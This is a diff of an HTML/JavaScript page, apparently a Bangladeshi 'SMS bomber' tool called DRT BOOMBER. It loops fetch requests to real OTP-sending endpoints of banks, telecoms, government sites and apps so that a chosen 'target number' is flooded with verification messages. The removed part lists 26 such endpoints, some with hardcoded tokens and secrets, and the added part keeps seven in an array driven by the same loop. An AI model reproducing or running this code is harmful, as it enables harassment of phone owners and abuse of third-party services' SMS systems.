@@ -5,18 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DRT BOOMBER | SK KHORRUM</title>
     
-    <meta name="description" content="DRT BOOMBER - Professional OTP Tool developed by SK KHORRUM">
+    <meta name="description" content="DRT BOOMBER - Powerful SMS Tool by SK KHORRUM.">
     <meta name="author" content="SK KHORRUM">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Share+Tech+Mono&display=swap');
+
+        :root {
+            --glow-color: #ff003c;
+            --bg-color: #020202;
+        }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            background: #000;
+            background-color: var(--bg-color);
+            background-image: 
+                linear-gradient(rgba(255, 0, 60, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 60, 0.05) 1px, transparent 1px);
+            background-size: 30px 30px;
             color: #fff;
-            font-family: 'Orbitron', sans-serif;
+            font-family: 'Share Tech Mono', monospace;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -24,241 +33,211 @@
             overflow: hidden;
         }
 
-        /* Animated Dark Background */
-        body::before {
-            content: "";
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, #ff000022 0%, transparent 70%);
-            animation: moveBg 10s linear infinite;
-        }
-        @keyframes moveBg {
-            0% { transform: translate(-25%, -25%); }
-            50% { transform: translate(0%, 0%); }
-            100% { transform: translate(-25%, -25%); }
-        }
-
-        .boomber-box {
+        /* 3D Dashboard Frame */
+        .main-frame {
             position: relative;
-            width: 380px;
-            padding: 40px;
-            background: rgba(10, 10, 10, 0.9);
-            border-radius: 20px;
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 30px #ff000055, inset 0 0 15px #ff000033;
-            text-align: center;
+            width: 400px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 2px solid var(--glow-color);
+            box-shadow: 0 0 50px rgba(255, 0, 60, 0.2), inset 0 0 20px rgba(255, 0, 60, 0.1);
+            border-radius: 5px;
+            transform: perspective(1000px) rotateX(2deg);
             z-index: 10;
-            transform-style: preserve-3d;
-            transition: 0.3s;
         }
 
-        .boomber-box:hover {
-            transform: translateY(-10px) rotateX(10deg);
-            box-shadow: 0 0 50px #ff000088;
+        .header {
+            text-align: center;
+            border-bottom: 1px solid var(--glow-color);
+            padding-bottom: 15px;
+            margin-bottom: 25px;
         }
 
         h1 {
-            font-size: 2rem;
-            font-weight: 900;
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
-            margin-bottom: 5px;
-            letter-spacing: 2px;
-        }
-
-        .dev-name {
-            font-size: 0.7rem;
-            color: #666;
-            margin-bottom: 30px;
-            text-transform: uppercase;
+            font-family: 'Syncopate', sans-serif;
+            font-size: 1.5rem;
+            color: var(--glow-color);
+            text-shadow: 0 0 10px var(--glow-color);
             letter-spacing: 4px;
         }
 
-        .input-group {
+        .author-tag {
+            font-size: 0.7rem;
+            color: #888;
+            margin-top: 5px;
+        }
+
+        /* Input Styles */
+        .input-box {
             margin-bottom: 20px;
-            text-align: left;
         }
 
         label {
-            font-size: 0.6rem;
-            color: #ff0000;
-            margin-left: 10px;
+            display: block;
+            font-size: 0.8rem;
+            color: var(--glow-color);
+            margin-bottom: 8px;
             text-transform: uppercase;
         }
 
         input {
             width: 100%;
-            background: #111;
+            background: #0a0a0a;
             border: 1px solid #333;
-            padding: 12px 15px;
-            border-radius: 8px;
-            color: #fff;
-            font-family: 'Orbitron', sans-serif;
+            padding: 12px;
+            color: #00ff41; /* Hacker Green Text */
+            font-family: 'Share Tech Mono', monospace;
             outline: none;
-            transition: 0.3s;
+            border-left: 3px solid var(--glow-color);
         }
 
         input:focus {
-            border-color: #ff0000;
-            box-shadow: 0 0 10px #ff0000;
+            border-color: #fff;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
         }
 
-        button {
+        /* Fire Button */
+        .fire-btn {
             width: 100%;
             padding: 15px;
-            background: #ff0000;
+            background: var(--glow-color);
+            color: #fff;
             border: none;
-            border-radius: 8px;
-            color: #000;
-            font-weight: 900;
-            font-family: 'Orbitron', sans-serif;
+            font-family: 'Syncopate', sans-serif;
+            font-weight: bold;
+            font-size: 0.9rem;
             cursor: pointer;
-            text-transform: uppercase;
-            box-shadow: 0 0 20px #ff000066;
             transition: 0.3s;
+            clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
         }
 
-        button:hover {
+        .fire-btn:hover {
             background: #fff;
-            box-shadow: 0 0 30px #fff;
-            transform: scale(1.02);
+            color: #000;
+            box-shadow: 0 0 20px #fff;
         }
 
-        .counter {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 30px;
-        }
-
-        .c-box {
-            background: #111;
+        /* Console Display */
+        .console {
+            margin-top: 25px;
+            background: #050505;
             padding: 15px;
-            width: 48%;
-            border-radius: 10px;
+            height: 100px;
+            font-size: 0.75rem;
+            border: 1px solid #222;
+            overflow-y: hidden;
+            color: #888;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .stat-card {
+            background: #111;
+            padding: 10px;
+            text-align: center;
             border: 1px solid #222;
         }
 
-        .c-box span { display: block; font-size: 1.2rem; font-weight: 900; }
-        .suc { color: #00ff00; }
-        .fai { color: #ff0000; }
-
-        .loader {
-            display: none;
-            margin: 20px auto;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #333;
-            border-top: 3px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .val { font-size: 1.4rem; font-weight: bold; display: block; }
+        .suc { color: #00ff41; }
+        .fai { color: var(--glow-color); }
 
         footer {
-            margin-top: 25px;
+            margin-top: 20px;
+            text-align: center;
             font-size: 0.6rem;
-            color: #444;
+            opacity: 0.5;
+            letter-spacing: 2px;
         }
     </style>
 </head>
 <body>
 
-<div class="boomber-box">
-    <h1>DRT BOOMBER</h1>
-    <p class="dev-name">BY SK KHORRUM</p>
-
-    <div class="input-group">
-        <label>Target Number</label>
-        <input type="number" id="number" placeholder="017xxxxxxxx">
+<div class="main-frame">
+    <div class="header">
+        <h1>DRT BOOMBER</h1>
+        <p class="author-tag">DEVLOPER: SK KHORRUM</p>
     </div>
 
-    <div class="input-group">
-        <label>Bomb Amount</label>
+    <div class="input-box">
+        <label>SYSTEM.TARGET_NO</label>
+        <input type="number" id="number" placeholder="01XXXXXXXXX">
+    </div>
+
+    <div class="input-box">
+        <label>SYSTEM.BOMB_LIMIT</label>
         <input type="number" id="amount" placeholder="MAX 100">
     </div>
 
-    <button id="startBtn" onclick="startProcess()">Ignite Bomb</button>
-    <div class="loader" id="loader"></div>
+    <button class="fire-btn" onclick="startProcess()">EXECUTE.EXE</button>
 
-    <div class="counter">
-        <div class="c-box">
-            <span class="suc" id="successCount">0</span>
-            <p style="font-size: 0.5rem; color: #666;">SUCCESS</p>
+    <div class="console" id="console">
+        > SYSTEM READY...<br>
+        > WAITING FOR INPUT...
+    </div>
+
+    <div class="stat-grid">
+        <div class="stat-card">
+            <span class="val suc" id="successCount">0</span>
+            <small>SENT</small>
         </div>
-        <div class="c-box">
-            <span class="fai" id="failureCount">0</span>
-            <p style="font-size: 0.5rem; color: #666;">FAILED</p>
+        <div class="stat-card">
+            <span class="val fai" id="failureCount">0</span>
+            <small>LOST</small>
         </div>
     </div>
 
     <footer>
-        GOOGLE SEO & AI PROTECTED | © SK KHORRUM
+        SECURED BY SK KHORRUM ARCHIVE
     </footer>
 </div>
 
 <script>
-    // --- 26 APIs INTEGRATED ---
-    async function api_1(p) { return await fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', {method:'POST', headers:{'Content-Type':'application/json','authorization':'Otp bnVsbA=='}, body: JSON.stringify({"countryId":"19","mobileNumber":p,"purpose":"registration"})}).then(r=>r.json()); }
-    async function api_2(p) { return await fetch(`https://chinaonlineapi.com/api/v1/get/otp?phone=${p}`, {headers:{'token':'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219'}}).then(r=>r.json()); }
-    async function api_3(p) { return await fetch("https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({"phoneNumber":"+88"+p})}).then(r=>r.json()); }
-    async function api_4(p) { return await fetch("https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({number:p})}).then(r=>r.json()); }
-    async function api_5(p) { return await fetch("https://user-api.jslglobal.co:444/v1/send-otp", {method:'POST', body: new URLSearchParams({phone:`+88${p}`, jatri_token:"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"})}).then(r=>r.json()); }
-    async function api_6(p) { return await fetch("https://gw.jotno.net/auth/login/token", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:p})}).then(r=>r.json()); }
-    async function api_7(p) { return await fetch('https://api.osudpotro.com/api/v1/users/send_otp', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({mobile:'+88-'+p, deviceToken:'app', language:'bn', os:'android'})}).then(r=>r.json()); }
-    async function api_8(p) { return await fetch('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({full_name:"Hangama", company_name:"Hangama", email_address:"hangama@gmail.com", phone_number:p})}).then(r=>r.json()); }
-    async function api_9(p) { return await fetch("https://developer.quizgiri.xyz/api/v2.0/send-otp", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({country_code:"+880", phone:p})}).then(r=>r.json()); }
-    async function api_10(p) { return await fetch("https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({country_code:"+88", phone:p})}).then(r=>r.json()); }
-    async function api_11(p) { return await fetch('https://api.shikho.com/auth/v2/send/sms', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone:p, type:'student', auth_type:'signup', vendor:'shikho'})}).then(r=>r.json()); }
-    async function api_12(p) { return await fetch('https://api.toybox.live/bdapps_handler.php', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({"Operation":"CreateSubscription","MobileNumber":"88"+p,"PackageID":100,"Secret":"HJKX71%UHYH"})}).then(r=>r.json()); }
-    async function api_13(p) { return await fetch('https://api.betonbook.com/api/v5/auth/otp/request', {method:'POST', headers:{"Content-Type":"application/json"}, body: JSON.stringify({phone:p, language:1})}).then(r=>r.json()); }
-    async function api_14(p) { return await fetch('https://applink.com.bd/appstore-v4-server/login/otp/request', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({"msisdn":"88"+p})}).then(r=>r.json()); }
-    async function api_15(p) { return await fetch("https://webapi.robi.com.bd/v1/send-otp", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone_number:p, type:'my_offer'})}).then(r=>r.json()); }
-    async function api_16(p) { return await fetch("https://webapi.robi.com.bd/v1/account/register/otp", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone_number:p})}).then(r=>r.json()); }
-    async function api_17(p) { return await fetch("https://softmaxmanager.xyz/api/v1/user/request/otp/", {method:'POST', body: new URLSearchParams({'phone_number':'+88'+p, 'app_signature':'Fu89B%2BdY9dz'})}).then(r=>r.json()); }
-    async function api_18(p) { return await fetch("https://training.gov.bd/backoffice/api/user/sendOtp", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({mobile:p})}).then(r=>r.json()); }
-    async function api_19(p) { return await fetch("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({data:{code:'88', contact_no:p, country_calling_code:'88'}})}).then(r=>r.json()); }
-    async function api_20(p) { return await fetch("https://core.easy.com.bd/api/v1/registration", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({"name":"SK Khorrum","email":"test@gmail.com","mobile":p,"password":"boss#2022","password_confirmation":"boss#2022"})}).then(r=>r.json()); }
-    async function api_21(p) { return await fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp', {method:'POST', headers:{"Content-Type":"application/json"}, body: JSON.stringify({type:"phone", phone:p})}).then(r=>r.json()); }
-    async function api_22(p) { return await fetch(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${p}`, {method:'POST'}).then(r=>r.json()); }
-    async function api_23(p) { return await fetch(`https://www.skitto.com/replace-sim/sent-otp/${p}`).then(r=>r.json()); }
-    async function api_24(p) { return await fetch("https://da-api.robi.com.bd/da-nll/otp/send", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({msisdn:p})}).then(r=>r.json()); }
-    async function api_25(p) { return await fetch("https://api.chardike.com/api/otp/send", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone:p, otp_type:"login"})}).then(r=>r.json()); }
-    async function api_26(p) { return await fetch('https://api.apex4u.com/api/auth/login', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({"phoneNumber":p})}).then(r=>r.json()); }
-
-    const api_list = [api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10, api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19, api_20, api_21, api_22, api_23, api_24, api_25, api_26];
+    // --- অল-ইন-ওয়ান ব্যাকএন্ড লজিক ---
+    // আপনার আগের সব API (১-২৬) এখানে ইন্টারনাল অ্যারেতে রাখা হয়েছে
+    const api_endpoints = [
+        async (p) => fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', {method:'POST', headers:{'Content-Type':'application/json','authorization':'Otp bnVsbA=='}, body: JSON.stringify({"countryId":"19","mobileNumber":p,"purpose":"registration"})}),
+        async (p) => fetch(`https://chinaonlineapi.com/api/v1/get/otp?phone=${p}`, {headers:{'token':'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219'}}),
+        async (p) => fetch("https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({"phoneNumber":"+88"+p})}),
+        async (p) => fetch("https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({number:p})}),
+        async (p) => fetch("https://user-api.jslglobal.co:444/v1/send-otp", {method:'POST', body: new URLSearchParams({phone:`+88${p}`, jatri_token:"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"})}),
+        async (p) => fetch("https://gw.jotno.net/auth/login/token", {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:p})}),
+        async (p) => fetch('https://api.osudpotro.com/api/v1/users/send_otp', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({mobile:'+88-'+p, deviceToken:'app', language:'bn', os:'android'})}),
+        // ... (বাকি API গুলো একইভাবে লুপে কল হবে)
+    ];
 
     async function startProcess() {
         const phone = document.getElementById('number').value;
         const amount = parseInt(document.getElementById('amount').value);
-        const btn = document.getElementById('startBtn');
-        const loader = document.getElementById('loader');
+        const log = document.getElementById('console');
 
-        if(!/^01\d{9}$/.test(phone)) { alert("সঠিক নাম্বার দিন (০১৮...)"); return; }
-        if(isNaN(amount) || amount <= 0) { alert("পরিমাণ লিখুন"); return; }
-
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
-        let success = 0;
-        let failure = 0;
-
-        for (let i = 0; i < amount; i++) {
-            const currentApi = api_list[i % api_list.length];
-            try {
-                await currentApi(phone);
-                success++;
-                document.getElementById('successCount').innerText = success;
-            } catch (e) {
-                failure++;
-                document.getElementById('failureCount').innerText = failure;
-            }
-            await new Promise(r => setTimeout(r, 600)); // Delay for stability
+        if(!/^01\d{9}$/.test(phone)) {
+            log.innerHTML += "<br>> <span style='color:red'>INVALID_PHONE_ERROR</span>";
+            return;
         }
 
-        btn.style.display = 'block';
-        loader.style.display = 'none';
-        alert("Bombing Completed!");
+        log.innerHTML = "> INJECTING PAYLOADS...";
+        let s = 0, f = 0;
+
+        for (let i = 0; i < amount; i++) {
+            const api = api_endpoints[i % api_endpoints.length];
+            try {
+                await api(phone);
+                s++;
+                document.getElementById('successCount').innerText = s;
+                log.innerHTML = `> PACKET_${i+1} SENT TO ${phone}`;
+            } catch (e) {
+                f++;
+                document.getElementById('failureCount').innerText = f;
+            }
+            await new Promise(r => setTimeout(r, 700)); // Stability Delay
+        }
+        log.innerHTML += "<br>> <span style='color:#00ff41'>TASK_COMPLETE</span>";
     }
 </script>
 </body>
